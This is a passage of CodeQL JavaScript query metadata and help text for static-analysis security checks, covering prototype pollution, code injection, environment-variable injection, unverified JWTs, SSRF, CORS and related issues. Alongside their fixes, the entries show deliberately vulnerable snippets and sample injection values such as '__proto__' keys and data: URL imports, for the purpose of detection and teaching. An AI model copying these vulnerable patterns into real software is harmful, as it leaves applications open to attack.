      * Wikipedia: [Billion Laughs](https://en.wikipedia.org/wiki/Billion_laughs).
      * Bryan Sullivan: [Security Briefs - XML Denial of Service Attacks and Defenses](https://msdn.microsoft.com/en-us/magazine/ee335713.aspx).
      * Common Weakness Enumeration: [CWE-776](https://cwe.mitre.org/data/definitions/776.html).
      * Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: experimental/heuristics/ql/src/Security/CWE-807/ConditionalBypass.ql
    relativeBqrsPath: codeql/javascript-queries/experimental/heuristics/ql/src/Security/CWE-807/ConditionalBypass.bqrs
    metadata:
      name: User-controlled bypass of security check with additional heuristic sources
      description:
        Conditions that the user controls are not suited for making security-related
        decisions.
      kind: path-problem
      problem.severity: error
      security-severity: 7.8
      precision: medium
      id: js/user-controlled-bypass-more-sources
      tags: |-
        experimental
               security
               external/cwe/cwe-807
               external/cwe/cwe-290
    queryHelp: |
      # User-controlled bypass of security check with additional heuristic sources
      Using user-controlled data in a permissions check may allow a user to gain unauthorized access to protected functionality or data.


      ## Recommendation
      When checking whether a user is authorized for a particular activity, do not use data that is entirely controlled by that user in the permissions check. If necessary, always validate the input, ideally against a fixed list of expected values.

      Similarly, do not decide which permission to check for, based on user data. In particular, avoid using computation to decide which permissions to check for. Use fixed permissions for particular actions, rather than generating the permission to check for.


      ## Example
      In this example, we have a server that shows private information for a user, based on the request parameter `userId`. For privacy reasons, users may only view their own private information, so the server checks that the request parameter `userId` matches a cookie value for the user who is logged in.


      ```javascript
      var express = require('express');
      var app = express();
      // ...
      app.get('/full-profile/:userId', function(req, res) {

          if (req.cookies.loggedInUserId !== req.params.userId) {
              // BAD: login decision made based on user controlled data
              requireLogin();
          } else {
              // ... show private information
          }

      });

      ```
      This security check is, however, insufficient since an attacker can craft their cookie values to match those of any user. To prevent this, the server can cryptographically sign the security critical cookie values:


      ```javascript
      var express = require('express');
      var app = express();
      // ...
      app.get('/full-profile/:userId', function(req, res) {

          if (req.signedCookies.loggedInUserId !== req.params.userId) {
              // GOOD: login decision made based on server controlled data
              requireLogin();
          } else {
              // ... show private information
          }

      });

      ```

      ## References
      * Common Weakness Enumeration: [CWE-807](https://cwe.mitre.org/data/definitions/807.html).
      * Common Weakness Enumeration: [CWE-290](https://cwe.mitre.org/data/definitions/290.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: experimental/heuristics/ql/src/Security/CWE-915/PrototypePollutingAssignment.ql
    relativeBqrsPath: codeql/javascript-queries/experimental/heuristics/ql/src/Security/CWE-915/PrototypePollutingAssignment.bqrs
    metadata:
      name: Prototype-polluting assignment with additional heuristic sources
      description: |-
        Modifying an object obtained via a user-controlled property name may
                      lead to accidental mutation of the built-in Object prototype,
                      and possibly escalate to remote code execution or cross-site scripting.
      kind: path-problem
      problem.severity: warning
      security-severity: 6.1
      precision: high
      id: js/prototype-polluting-assignment-more-sources
      tags: |-
        experimental
               security
               external/cwe/cwe-078
               external/cwe/cwe-079
               external/cwe/cwe-094
               external/cwe/cwe-400
               external/cwe/cwe-471
               external/cwe/cwe-915
    queryHelp: |
      # Prototype-polluting assignment with additional heuristic sources
      Most JavaScript objects inherit the properties of the built-in `Object.prototype` object. Prototype pollution is a type of vulnerability in which an attacker is able to modify `Object.prototype`. Since most objects inherit from the compromised `Object.prototype` object, the attacker can use this to tamper with the application logic, and often escalate to remote code execution or cross-site scripting.

      One way to cause prototype pollution is by modifying an object obtained via a user-controlled property name. Most objects have a special `__proto__` property that refers to `Object.prototype`. An attacker can abuse this special property to trick the application into performing unintended modifications of `Object.prototype`.


      ## Recommendation
      Use an associative data structure that is resilient to untrusted key values, such as a [Map](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Map). In some cases, a prototype-less object created with [Object.create(null)](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/create) may be preferable.

      Alternatively, restrict the computed property name so it can't clash with a built-in property, either by prefixing it with a constant string, or by rejecting inputs that don't conform to the expected format.


      ## Example
      In the example below, the untrusted value `req.params.id` is used as the property name `req.session.todos[id]`. If a malicious user passes in the ID value `__proto__`, the variable `items` will then refer to `Object.prototype`. Finally, the modification of `items` then allows the attacker to inject arbitrary properties onto `Object.prototype`.


      ```javascript
      let express = require('express');
      let app = express()

      app.put('/todos/:id', (req, res) => {
          let id = req.params.id;
          let items = req.session.todos[id];
          if (!items) {
              items = req.session.todos[id] = {};
          }
          items[req.query.name] = req.query.text;
          res.end(200);
      });

      ```
      One way to fix this is to use [Map](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Map) objects to associate key/value pairs instead of regular objects, as shown below:


      ```javascript
      let express = require('express');
      let app = express()

      app.put('/todos/:id', (req, res) => {
          let id = req.params.id;
          let items = req.session.todos.get(id);
          if (!items) {
              items = new Map();
              req.sessions.todos.set(id, items);
          }
          items.set(req.query.name, req.query.text);
          res.end(200);
      });

      ```
      Another way to fix it is to prevent the `__proto__` property from being used as a key, as shown below:


      ```javascript
      let express = require('express');
      let app = express()

      app.put('/todos/:id', (req, res) => {
          let id = req.params.id;
          if (id === '__proto__' || id === 'constructor' || id === 'prototype') {
              res.end(403);
              return;
          }
          let items = req.session.todos[id];
          if (!items) {
              items = req.session.todos[id] = {};
          }
          items[req.query.name] = req.query.text;
          res.end(200);
      });

      ```

      ## References
      * MDN: [Object.prototype.__proto__](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/proto)
      * MDN: [Map](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Map)
      * Common Weakness Enumeration: [CWE-78](https://cwe.mitre.org/data/definitions/78.html).
      * Common Weakness Enumeration: [CWE-79](https://cwe.mitre.org/data/definitions/79.html).
      * Common Weakness Enumeration: [CWE-94](https://cwe.mitre.org/data/definitions/94.html).
      * Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).
      * Common Weakness Enumeration: [CWE-471](https://cwe.mitre.org/data/definitions/471.html).
      * Common Weakness Enumeration: [CWE-915](https://cwe.mitre.org/data/definitions/915.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: experimental/Security/CWE-094-dataURL/CodeInjection.ql
    relativeBqrsPath: codeql/javascript-queries/experimental/Security/CWE-094-dataURL/CodeInjection.bqrs
    metadata:
      name: Code injection from dynamically imported code
      description: |-
        Interpreting unsanitized user input as code allows a malicious user arbitrary
                      code execution.
      kind: path-problem
      problem.severity: error
      security-severity: 9.3
      precision: high
      id: js/code-injection-dynamic-import
      tags: |-
        security
               external/cwe/cwe-094
               external/cwe/cwe-095
               external/cwe/cwe-079
               external/cwe/cwe-116
    queryHelp: |
      # Code injection from dynamically imported code
      Directly evaluating user input (for example, an HTTP request parameter) as code without properly sanitizing the input first allows an attacker arbitrary code execution. This can occur when user input is treated as JavaScript, or passed to a framework which interprets it as an expression to be evaluated. Examples include AngularJS expressions or JQuery selectors.


      ## Recommendation
      Avoid including user input in any expression which may be dynamically evaluated. If user input must be included, use context-specific escaping before including it. It is important that the correct escaping is used for the type of evaluation that will occur.


      ## Example
      The following example shows part of the page URL being evaluated as JavaScript code on the server. This allows an attacker to provide JavaScript within the URL and send it to server. client side attacks need victim users interaction like clicking on a attacker provided URL.


      ```javascript
      const { Worker } = require('node:worker_threads');
      var app = require('express')();

      app.post('/path', async function (req, res) {
          const payload = req.query.queryParameter // like:  payload = 'data:text/javascript,console.log("hello!");//'
          const payloadURL = new URL(payload)
          new Worker(payloadURL);
      });

      app.post('/path2', async function (req, res) {
          const payload = req.query.queryParameter // like:  payload = 'data:text/javascript,console.log("hello!");//'
          await import(payload)
      });


      ```

      ## References
      * OWASP: [Code Injection](https://www.owasp.org/index.php/Code_Injection).
      * Wikipedia: [Code Injection](https://en.wikipedia.org/wiki/Code_injection).
      * PortSwigger Research Blog: [Server-Side Template Injection](https://portswigger.net/research/server-side-template-injection).
      * Common Weakness Enumeration: [CWE-94](https://cwe.mitre.org/data/definitions/94.html).
      * Common Weakness Enumeration: [CWE-95](https://cwe.mitre.org/data/definitions/95.html).
      * Common Weakness Enumeration: [CWE-79](https://cwe.mitre.org/data/definitions/79.html).
      * Common Weakness Enumeration: [CWE-116](https://cwe.mitre.org/data/definitions/116.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: experimental/Security/CWE-099/EnvValueAndKeyInjection.ql
    relativeBqrsPath: codeql/javascript-queries/experimental/Security/CWE-099/EnvValueAndKeyInjection.bqrs
    metadata:
      name: User controlled arbitrary environment variable injection
      description:
        creating arbitrary environment variables from user controlled data
        is not secure
      kind: path-problem
      id: js/env-key-and-value-injection
      problem.severity: error
      security-severity: 7.5
      precision: medium
      tags: |-
        security
               external/cwe/cwe-089
    queryHelp: |
      # User controlled arbitrary environment variable injection
      Controlling the value of arbitrary environment variables from user-controllable data is not safe.


      ## Recommendation
      Restrict this operation only to privileged users or only for some not important environment variables.


      ## Example
      The following example allows unauthorized users to assign a value to any environment variable.


      ```javascript
      const http = require('node:http');

      http.createServer((req, res) => {
        const { EnvValue, EnvKey } = req.body;
        process.env[EnvKey] = EnvValue; // NOT OK

        res.end('env has been injected!');
      });
      ```

      ## References
      * [Admin account TakeOver in mintplex-labs/anything-llm](https://huntr.com/bounties/00ec6847-125b-43e9-9658-d3cace1751d6/)
      * Common Weakness Enumeration: [CWE-89](https://cwe.mitre.org/data/definitions/89.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: experimental/Security/CWE-099/EnvValueInjection.ql
    relativeBqrsPath: codeql/javascript-queries/experimental/Security/CWE-099/EnvValueInjection.bqrs
    metadata:
      name: User controlled environment variable value injection
      description:
        assigning important environment variables from user controlled data
        is not secure
      kind: path-problem
      id: js/env-value-injection
      problem.severity: error
      security-severity: 7.5
      precision: medium
      tags: |-
        security
               external/cwe/cwe-089
    queryHelp: |
      # User controlled environment variable value injection
      Assigning Value to environment variables from user-controllable data is not safe.


      ## Recommendation
      Restrict this operation only to privileged users or only for some not important environment variables.


      ## Example
      The following example allows unauthorized users to assign a value to a critical environment variable.


      ```javascript
      const http = require('node:http');

      http.createServer((req, res) => {
        const { EnvValue } = req.body;
        process.env["A_Critical_Env"] = EnvValue; // NOT OK

        res.end('env has been injected!');
      });
      ```

      ## References
      * [Admin account TakeOver in mintplex-labs/anything-llm](https://huntr.com/bounties/00ec6847-125b-43e9-9658-d3cace1751d6/)
      * Common Weakness Enumeration: [CWE-89](https://cwe.mitre.org/data/definitions/89.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: experimental/Security/CWE-340/TokenBuiltFromUUID.ql
    relativeBqrsPath: codeql/javascript-queries/experimental/Security/CWE-340/TokenBuiltFromUUID.bqrs
    metadata:
      name: Predictable token
      description: |-
        Tokens used for sensitive tasks, such as, password recovery,
          and email confirmation, should not use predictable values.
      kind: path-problem
      precision: medium
      problem.severity: error
      security-severity: 5
      id: js/predictable-token
      tags: |-
        security
               experimental
               external/cwe/cwe-340
    queryHelp: |
      # Predictable token
      GUIDs (often called UUIDs) are widely used in modern web applications. One common use for UUIDs is the generation of one-time-use tokens. These can used for password reset, and e-mail confirmation routines, for example.

      There are five versions of UUIDs defined in RFC 4122. Out of the five, four are generated in a predictable manner. This means it is possible for someone to predict future UUIDs based on a sample generated by the target application.

      Version four is the only UUID version expected to be randomly generated. Therefore, for situations where predictable tokens are not desired (e.g. password reset tokens), all other versions should be avoided.


      ## Recommendation
      When using GUIDs/UUIDs for generating tokens that should not be predictable, use version four.


      ## Example
      This example shows a UUID v1 being used for a password reset routine.


      ```javascript
      var uuid = require('uuid');

      module.exports = function (app) {

          app.use('/login', function (req, res) {

              var username = req.body.username;
              var password = req.body.password;

              if (!username) {
                  res.status(400);
                  return;
              }

              if (!password) {
                  res.status(400);
                  return;
              }

              var newToken = {
                  userId: user._id,
                  token: uuid.v1(),
                  created: new Date(),
              };

              res.status(200).json({
                  token: newToken.token
              });
          });
      };
      ```

      ## References
      * UUID [RFC](https://datatracker.ietf.org/doc/html/rfc4122).
      * Daniel Thatcher *In GUID We Trust* [article](https://www.intruder.io/research/in-guid-we-trust).
      * UUID exploitation [tool](https://github.com/intruder-io/guidtool).
      * Common Weakness Enumeration: [CWE-340](https://cwe.mitre.org/data/definitions/340.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: experimental/Security/CWE-347/decodeJwtWithoutVerification.ql
    relativeBqrsPath: codeql/javascript-queries/experimental/Security/CWE-347/decodeJwtWithoutVerification.bqrs
    metadata:
      name: JWT missing secret or public key verification
      description:
        The application does not verify the JWT payload with a cryptographic
        secret or public key.
      kind: path-problem
      problem.severity: error
      security-severity: 8.0
      precision: high
      id: js/decode-jwt-without-verification
      tags: |-
        security
               external/cwe/cwe-347
    queryHelp: |
      # JWT missing secret or public key verification
      A JSON Web Token (JWT) is used for authenticating and managing users in an application.

      Only Decoding JWTs without checking if they have a valid signature or not can lead to security vulnerabilities.


      ## Recommendation
      Don't use methods that only decode JWT, Instead use methods that verify the signature of JWT.


      ## Example
      In the following code, you can see the proper usage of the most popular JWT libraries.


      ```javascript
      const express = require('express')
      const app = express()
      const jwtJsonwebtoken = require('jsonwebtoken');
      const jwt_decode = require('jwt-decode');
      const jwt_simple = require('jwt-simple');
      const jose = require('jose')
      const port = 3000

      function getSecret() {
          return "A Safe generated random key"
      }

      app.get('/jose1', async (req, res) => {
          const UserToken = req.headers.authorization;
          // GOOD: with signature verification
          await jose.jwtVerify(UserToken, new TextEncoder().encode(getSecret()))
      })

      app.get('/jose2', async (req, res) => {
          const UserToken = req.headers.authorization;
          // GOOD: first without signature verification then with signature verification for same UserToken
          jose.decodeJwt(UserToken)
          await jose.jwtVerify(UserToken, new TextEncoder().encode(getSecret()))
      })

      app.get('/jwtSimple1', (req, res) => {
          const UserToken = req.headers.authorization;
          // GOOD: first without signature verification then with signature verification for same UserToken
          jwt_simple.decode(UserToken, getSecret(), false);
          jwt_simple.decode(UserToken, getSecret());
      })

      app.get('/jwtSimple2', (req, res) => {
          const UserToken = req.headers.authorization;
          // GOOD: with signature verification
          jwt_simple.decode(UserToken, getSecret(), true);
          jwt_simple.decode(UserToken, getSecret());
      })

      app.get('/jwtJsonwebtoken1', (req, res) => {
          const UserToken = req.headers.authorization;
          // GOOD: with signature verification
          jwtJsonwebtoken.verify(UserToken, getSecret())
      })

      app.get('/jwtJsonwebtoken2', (req, res) => {
          const UserToken = req.headers.authorization;
          // GOOD: first without signature verification then with signature verification for same UserToken
          jwtJsonwebtoken.decode(UserToken)
          jwtJsonwebtoken.verify(UserToken, getSecret())
      })


      app.listen(port, () => {
          console.log(`Example app listening on port ${port}`)
      })
      ```
      In the following code, you can see the improper usage of the most popular JWT libraries.


      ```javascript
      const express = require('express')
      const app = express()
      const jwtJsonwebtoken = require('jsonwebtoken');
      const jwt_decode = require('jwt-decode');
      const jwt_simple = require('jwt-simple');
      const jose = require('jose')
      const port = 3000

      function getSecret() {
          return "A Safe generated random key"
      }
      app.get('/jose', (req, res) => {
          const UserToken = req.headers.authorization;
          // BAD: no signature verification
          jose.decodeJwt(UserToken)
      })

      app.get('/jwtDecode', (req, res) => {
          const UserToken = req.headers.authorization;
          // BAD: no signature verification
          jwt_decode(UserToken)
      })

      app.get('/jwtSimple', (req, res) => {
          const UserToken = req.headers.authorization;
          // jwt.decode(token, key, noVerify, algorithm)
          // BAD: no signature verification
          jwt_simple.decode(UserToken, getSecret(), true);
      })

      app.get('/jwtJsonwebtoken', (req, res) => {
          const UserToken = req.headers.authorization;
          // BAD: no signature verification
          jwtJsonwebtoken.decode(UserToken)
      })

      app.listen(port, () => {
          console.log(`Example app listening on port ${port}`)
      })

      ```

      ## References
      * [JWT claim has not been verified](https://www.ghostccamm.com/blog/multi_strapi_vulns/#cve-2023-22893-authentication-bypass-for-aws-cognito-login-provider-in-strapi-versions-456)
      * Common Weakness Enumeration: [CWE-347](https://cwe.mitre.org/data/definitions/347.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: experimental/Security/CWE-347/decodeJwtWithoutVerificationLocalSource.ql
    relativeBqrsPath: codeql/javascript-queries/experimental/Security/CWE-347/decodeJwtWithoutVerificationLocalSource.bqrs
    metadata:
      name: JWT missing secret or public key verification
      description:
        The application does not verify the JWT payload with a cryptographic
        secret or public key.
      kind: path-problem
      problem.severity: error
      security-severity: 8.0
      precision: high
      id: js/decode-jwt-without-verification-local-source
      tags: |-
        security
               external/cwe/cwe-347
  - pack: codeql/javascript-queries#0
    relativeQueryPath: experimental/Security/CWE-444/InsecureHttpParser.ql
    relativeBqrsPath: codeql/javascript-queries/experimental/Security/CWE-444/InsecureHttpParser.bqrs
    metadata:
      name: Insecure http parser
      description: Using an insecure http parser can lead to http smuggling attacks.
      kind: problem
      problem.severity: warning
      security-severity: 9.0
      precision: high
      id: js/insecure-http-parser
      tags: |-
        security
               external/cwe/cwe-444
    queryHelp: |
      # Insecure http parser
      Strict HTTP parsing may cause problems with interoperability with some non-conformant HTTP implementations. But disabling it is strongly discouraged, as it opens the door to several threats including HTTP Request Smuggling.


      ## Recommendation
      Do not enable insecure http parser.


      ## Example
      The following example shows the instantiation of an http server. This server is vulnerable to HTTP Request Smuggling because the `insecureHTTPParser` option of the server instantiation is set to `true`. As a consequence, malformed packets may attempt to exploit any number of weaknesses including ranging from Web Cache Poisoning Attacks to bypassing firewall protection mecahanisms.


      ```javascript
      const http = require('node:http');

      http.createServer({
          insecureHTTPParser: true
      }, (req, res) => {
          res.end('hello world\n');
      });
      ```
      To make sure that packets are parsed correctly, the `invalidHTTPParser` option should have its default value, or be explicitly set to `false`.


      ## References
      * NodeJS: [February 20 Security Release](https://nodejs.org/en/blog/vulnerability/february-2020-security-releases)
      * Snyk: [NodeJS Critical HTTP Vulnerability](https://snyk.io/blog/node-js-release-fixes-a-critical-http-security-vulnerability/)
      * CWE-444: [HTTP Request/Response Smuggling](https://cwe.mitre.org/data/definitions/444.html)
      * Common Weakness Enumeration: [CWE-444](https://cwe.mitre.org/data/definitions/444.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: experimental/Security/CWE-522-DecompressionBombs/DecompressionBombs.ql
    relativeBqrsPath: codeql/javascript-queries/experimental/Security/CWE-522-DecompressionBombs/DecompressionBombs.bqrs
    metadata:
      name: User-controlled file decompression
      description:
        User-controlled data that flows into decompression library APIs without
        checking the compression rate is dangerous
      kind: path-problem
      problem.severity: error
      security-severity: 7.8
      precision: high
      id: js/user-controlled-data-decompression
      tags: |-
        security
               experimental
               external/cwe/cwe-522
    queryHelp: |
      # User-controlled file decompression
      Extracting Compressed files with any compression algorithm like gzip can cause to denial of service attacks.

      Attackers can compress a huge file which created by repeated similiar byte and convert it to a small compressed file.


      ## Recommendation
      When you want to decompress a user-provided compressed file you must be careful about the decompression ratio or read these files within a loop byte by byte to be able to manage the decompressed size in each cycle of the loop.


      ## Example
      JsZip: check uncompressedSize Object Field before extraction.


      ```javascript
      const jszipp = require("jszip");
      function zipBombSafe(zipFile) {
          jszipp.loadAsync(zipFile.data).then(function (zip) {
              if (zip.file("10GB")["_data"]["uncompressedSize"] > 1024 * 1024 * 8) {
                  console.log("error")
              }
              zip.file("10GB").async("uint8array").then(function (u8) {
                  console.log(u8);
              });
          });
      }
      ```
      nodejs Zlib: use [maxOutputLength option](https://nodejs.org/dist/latest-v18.x/docs/api/zlib.html#class-options) which it'll limit the buffer read size


      ```javascript
      const zlib = require("zlib");

      zlib.gunzip(
          inputZipFile.data,
          { maxOutputLength: 1024 * 1024 * 5 },
          (err, buffer) => {
              doSomeThingWithData(buffer);
          });
      zlib.gunzipSync(inputZipFile.data, { maxOutputLength: 1024 * 1024 * 5 });

      inputZipFile.pipe(zlib.createGunzip({ maxOutputLength: 1024 * 1024 * 5 })).pipe(outputFile);
      ```
      node-tar: use [maxReadSize option](https://github.com/isaacs/node-tar/blob/8c5af15e43a769fd24aa7f1c84d93e54824d19d2/lib/list.js#L90) which it'll limit the buffer read size


      ```javascript
      const tar = require("tar");

      tar.x({
          file: tarFileName,
          strip: 1,
          C: 'some-dir',
          maxReadSize: 16 * 1024 * 1024 // 16 MB
      })
      ```

      ## References
      * [CVE-2017-16129](https://github.com/advisories/GHSA-8225-6cvr-8pqp)
      * [A great research to gain more impact by this kind of attacks](https://www.bamsoftware.com/hacks/zipbomb/)
      * Common Weakness Enumeration: [CWE-522](https://cwe.mitre.org/data/definitions/522.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: experimental/Security/CWE-918/SSRF.ql
    relativeBqrsPath: codeql/javascript-queries/experimental/Security/CWE-918/SSRF.bqrs
    metadata:
      id: javascript/ssrf
      kind: path-problem
      name: Uncontrolled data used in network request
      description:
        Sending network requests with user-controlled data as part of the
        URL allows for request forgery attacks.
      problem.severity: error
      precision: medium
      tags: |-
        security
               experimental
               external/cwe/cwe-918
    queryHelp: |
      # Uncontrolled data used in network request
      Directly incorporating user input into an HTTP request without validating the input can facilitate server side request forgery attacks, where the attacker essentially controls the request.


      ## Recommendation
      To guard against server side request forgery, it is advisable to avoid putting user input directly into a network request. If using user input is necessary, then is mandatory to validate them. Only allow numeric and alphanumeric values. URL encoding is not a solution in certain scenarios, such as, an architecture build over NGINX proxies.


      ## Example
      The following example shows an HTTP request parameter being used directly in a URL request without validating the input, which facilitates an SSRF attack. The request `axios.get("https://example.com/current_api/"+target)` is vulnerable since attackers can choose the value of `target` to be anything they want. For instance, the attacker can choose `"../super_secret_api"` as the target, causing the URL to become `"https://example.com/super_secret_api"`.

      A request to `https://example.com/super_secret_api` may be problematic if that api is not meant to be directly accessible from the attacker's machine.


      ```javascript
      const axios = require('axios');

      export const handler = async (req, res, next) => {
        const { target } = req.body;

        try {
          // BAD: `target` is controlled by the attacker
          const response = await axios.get('https://example.com/current_api/' + target);

          // process request response
          use(response);
        } catch (err) {
          // process error
        }
      };

      ```
      One way to remedy the problem is to validate the user input to only allow alphanumeric values:


      ```javascript
      const axios = require('axios');
      const validator = require('validator');

      export const handler = async (req, res, next) => {
        const { target } = req.body;

        if (!validator.isAlphanumeric(target)) {
          return next(new Error('Bad request'));
        }

        try {
          // `target` is validated
          const response = await axios.get('https://example.com/current_api/' + target);

          // process request response
          use(response);
        } catch (err) {
          // process error
        }
      };

      ```

      ## References
      * OWASP: [SSRF](https://www.owasp.org/www-community/attacks/Server_Side_Request_Forgery)
      * Common Weakness Enumeration: [CWE-918](https://cwe.mitre.org/data/definitions/918.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: experimental/Security/CWE-942/CorsPermissiveConfiguration.ql
    relativeBqrsPath: codeql/javascript-queries/experimental/Security/CWE-942/CorsPermissiveConfiguration.bqrs
    metadata:
      name: overly CORS configuration
      description: Misconfiguration of CORS HTTP headers allows CSRF attacks.
      kind: path-problem
      problem.severity: error
      security-severity: 7.5
      precision: high
      id: js/cors-misconfiguration
      tags: |-
        security
               external/cwe/cwe-942
    queryHelp: |
      # overly CORS configuration
      A server can use `CORS` (Cross-Origin Resource Sharing) to relax the restrictions imposed by the `SOP` (Same-Origin Policy), allowing controlled, secure cross-origin requests when necessary. A server with an overly permissive `CORS` configuration may inadvertently expose sensitive data or lead to `CSRF` which is an attack that allows attackers to trick users into performing unwanted operations in websites they're authenticated to.


      ## Recommendation
      When the `origin` is set to `true`, it signifies that the server is accepting requests from `any` origin, potentially exposing the system to CSRF attacks. This can be fixed using `false` as origin value or using a whitelist.

      On the other hand, if the `origin` is set to `null`, it can be exploited by an attacker to deceive a user into making requests from a `null` origin form, often hosted within a sandboxed iframe.

      If the `origin` value is user controlled, make sure that the data is properly sanitized.


      ## Example
      In the example below, the `server_1` accepts requests from any origin since the value of `origin` is set to `true`. And `server_2`'s origin is user-controlled.


      ```javascript
      import { ApolloServer } from 'apollo-server';
      var https = require('https'),
          url = require('url');

      var server = https.createServer(function () { });

      server.on('request', function (req, res) {
          // BAD: origin is too permissive
          const server_1 = new ApolloServer({
              cors: { origin: true }
          });

          let user_origin = url.parse(req.url, true).query.origin;
          // BAD: CORS is controlled by user
          const server_2 = new ApolloServer({
              cors: { origin: user_origin }
          });
      });
      ```
      In the example below, the `server_1` CORS is restrictive so it's not vulnerable to CSRF attacks. And `server_2`'s is using properly sanitized user-controlled data.


      ```javascript
      import { ApolloServer } from 'apollo-server';
      var https = require('https'),
          url = require('url');

      var server = https.createServer(function () { });

      server.on('request', function (req, res) {
          // GOOD: origin is restrictive
          const server_1 = new ApolloServer({
              cors: { origin: false }
          });

          let user_origin = url.parse(req.url, true).query.origin;
          // GOOD: user data is properly sanitized
          const server_2 = new ApolloServer({
              cors: { origin: (user_origin === "https://allowed1.com" || user_origin === "https://allowed2.com") ? user_origin : false }
          });
      });
      ```

      ## References
      * Mozilla Developer Network: [CORS, Access-Control-Allow-Origin](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Allow-Origin).
      * W3C: [CORS for developers, Advice for Resource Owners](https://w3c.github.io/webappsec-cors-for-developers/#resources)
      * Common Weakness Enumeration: [CWE-942](https://cwe.mitre.org/data/definitions/942.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: experimental/StandardLibrary/MultipleArgumentsToSetConstructor.ql
    relativeBqrsPath: codeql/javascript-queries/experimental/StandardLibrary/MultipleArgumentsToSetConstructor.bqrs
    metadata:
      name: Multiple arguments to `Set` constructor
      description: |-
        The `Set` constructor ignores all but the first argument, so passing multiple
                      arguments may indicate a mistake.
      kind: problem
      problem.severity: warning
      precision: high
      id: js/multiple-arguments-to-set-constructor
      tags: correctness
    queryHelp: |
      # Multiple arguments to `Set` constructor
      The `Set` constructor accepts an arbitrary number of arguments, but only the first one is used to construct the set. The remaining arguments are ignored. Code that invokes the `Set` constructor with multiple arguments is therefore likely to be incorrect.


      ## Recommendation
      Only pass a single argument to the `Set` constructor, which should be an iterable object (such as an array).


      ## Example
      The following example creates a set containing the vowels in the English language, and defines a function that returns a boolean indicating whether a given character is a vowel:


      ```javascript
      const vowels = new Set('a', 'e', 'i', 'o', 'u');

      function isVowel(char) {
        return vowels.has(char.toLowerCase());
      }

      ```
      However, this code does not work as intended: the `Set` constructor ignores all but the first argument, so the `vowels` set only contains the letter `a`.

      Instead, the list of vowels should be wrapped into an array:


      ```javascript
      const vowels = new Set(['a', 'e', 'i', 'o', 'u']);

      function isVowel(char) {
        return vowels.has(char.toLowerCase());
      }

      ```

      ## References
      * [MDN Web Docs: Set() constructor](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Set/Set)
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Expressions/BitwiseSignCheck.ql
    relativeBqrsPath: codeql/javascript-queries/Expressions/BitwiseSignCheck.bqrs
    metadata:
      name: Sign check of bitwise operation
      description:
        Checking the sign of the result of a bitwise operation may yield
        unexpected results.
      kind: problem
      problem.severity: warning
      id: js/bitwise-sign-check
      tags: |-
        reliability
               correctness
      precision: low
    queryHelp:
      "# Sign check of bitwise operation\nChecking whether the result of a\
      \ bitwise operation is greater than zero may yield unexpected results due to arithmetic\
      \ overflow.\n\n\n## Recommendation\nIt is more robust to check whether the result\
      \ of the bitwise operation is *non-zero*.\n\n\n## Example\nIn the following example,\
      \ function `bitIsSet` is meant to implement a check whether the `n`th bit of value\
      \ `x` is set.\n\n\n```javascript\nfunction bitIsSet(x, n) {\n\treturn (x & (1<<n))\
      \ > 0;\n}\n\nconsole.log(bitIsSet(-1, 31)); // prints 'false'\n```\nHowever, this\
      \ check fails to produce the correct value when `x` is set to `-1` (that is, all\
      \ its bits are ones), and `n` is set to `31`: in this case, the expression `x\
      \ & (1<<n)` evaluates to `-2147483648`. So the function returns `false`, even\
      \ though the 31st bit of `x` is, in fact, set.\n\nTo account for this edge case,\
      \ `bitIsSet` should be rewritten like this:\n\n\n```javascript\nfunction bitIsSet(x,\
      \ n) {\n\treturn (x & (1<<n)) !== 0;\n}\n\nconsole.log(bitIsSet(-1, 31)); // prints\
      \ 'false'\n```\n\n## References\n* Mozilla Developer Network: [Bitwise operators](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Bitwise_Operators).\n"
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Expressions/CompareIdenticalValues.ql
    relativeBqrsPath: codeql/javascript-queries/Expressions/CompareIdenticalValues.bqrs
    metadata:
      name: Comparison of identical values
      description: |-
        If the same expression occurs on both sides of a comparison
                      operator, the operator is redundant, and probably indicates a mistake.
      kind: problem
      problem.severity: warning
      id: js/comparison-of-identical-expressions
      tags: |-
        reliability
               correctness
               readability
               convention
               external/cwe/cwe-570
               external/cwe/cwe-571
      precision: low
    queryHelp:
      "# Comparison of identical values\nComparing two identical expressions\
      \ typically indicates a mistake such as a missing `this` qualifier or a misspelled\
      \ variable name. The only case where such a comparison makes semantic sense is\
      \ when determining whether a value is `NaN`, since `NaN` does not compare as equal\
      \ to itself. But even in this case clearer alternatives are available.\n\n\n##\
      \ Recommendation\nCarefully inspect the comparison to determine whether it is\
      \ a symptom of a bug. If the comparison is used to check for `NaN`, consider using\
      \ the `isNaN` function from the standard library instead.\n\n\n## Example\nIn\
      \ the example below, the method `Rectangle.prototype.contains` is intended to\
      \ check whether a point `(x, y)` lies inside a rectangle given by its origin `(this.x,\
      \ this.y)`, its width `this.width`, and its height `this.height`.\n\n\n```javascript\n\
      function Rectangle(x, y, width, height) {\n  this.x = x;\n  this.y = y;\n  this.width\
      \ = width;\n  this.height = height;\n}\n\nRectangle.prototype.contains = function(x,\
      \ y) {\n  return (this.x <= x &&\n          x < this.x+this.width) &&\n      \
